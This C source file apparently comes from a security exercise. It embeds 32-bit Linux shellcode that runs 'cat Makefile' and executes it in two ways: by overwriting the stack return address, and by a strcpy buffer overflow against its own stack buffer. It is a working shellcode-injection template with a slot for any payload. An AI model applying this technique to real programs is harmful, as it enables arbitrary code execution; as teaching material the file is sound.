#include <string.h>
#include <stdio.h>

// put the shellcode here in binary form: "\xAA\xBB..."
char shellcode[] = "\xEB\x29\x5E\x31\xC0\x88\x46\x08\x88\x46\x11\x89\x76\x12\x89\xF2\x83\xC2\x09\x89\x56\x16\x89\x46\x1A\xB0\x0B\x89\xF3\x8D\x4E\x12\x31\xD2\xCD\x80\x31\xC0\x40\x31\xDB\xCD\x80\xE8\xD2\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x63\x61\x74\x58\x4D\x61\x6B\x65\x66\x69\x6C\x65\x00";

void direct();
void overflow();

void main() {
	direct();
	// overflow();
}

void overwrite_return_address(void* address) {
	// hackish way of getting a pointer to the return address (4 bytes below the arg)
	void** ret_addr = (void**)((void*)&address - 4);
	*ret_addr = address;
}

// run the shellcode directly changing the return address
void direct() {
	char buffer[sizeof(shellcode)];		// large enough buffer
	memcpy(buffer, shellcode, sizeof(shellcode));

	overwrite_return_address(buffer);
}

// run the shellcode via overflow
char payload[128];
void overflow() {
	char buffer[96];	// the target buffer

	// prepare the payload
	//
	// the payload is filled with the address of the buffer, to overwrite the return address
	for (int i = 0; i < sizeof(payload)/4; i++)
		((long*)payload)[i] = (long)buffer;

	// and the shellcode in the beginning
	for (int i = 0; i < sizeof(shellcode); i++)
		payload[i] = shellcode[i];

	payload[sizeof(payload)-1] = 0;

	// the actual overflow attack
	strcpy(buffer, payload);
}

